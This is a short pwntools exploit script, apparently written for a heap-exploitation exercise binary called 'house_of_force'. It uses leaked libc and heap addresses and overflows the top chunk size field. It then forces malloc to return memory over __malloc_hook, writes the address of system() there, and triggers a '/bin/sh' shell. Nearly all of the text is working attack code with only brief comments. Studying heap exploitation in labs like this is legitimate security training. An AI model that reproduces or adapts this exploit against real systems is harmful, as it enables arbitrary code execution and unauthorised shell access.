
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # Updated path to libc

gdb_script = '''
continue
'''

def launch():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    else:
        return process(elf.path)

# Choose the "malloc" option; send the size and data.
def allocate(size, content):
    io.sendline(b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", content)
    io.recvuntil(b"> ")

# Compute the distance to wrap around between two addresses.
def distance(x, y):
    return (0xffffffffffffffff - x) + y

io = launch()

# The binary discloses the puts() address; use it to find the libc base address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts

# The binary also reveals the heap start address.
io.recvuntil(b"heap @ ")
heap_base = int(io.recvline().strip(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request a chunk; overflow the user data and change the top chunk size field to a large value.
# You can also write a "/bin/sh" string here instead of using the one in libc.
allocate(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))


allocate((libc.sym.__malloc_hook - 0x20) - (heap_base + 0x20), b"Y")


allocate(24, p64(libc.sym.system))


allocate(next(libc.search(b"/bin/sh")), b"")

#or

#call malloc() with the address of the "/bin/sh" string on the heap as an argument.
#allocate(heap_base + 0x10, b"")

# =============================================================================

io.interactive()
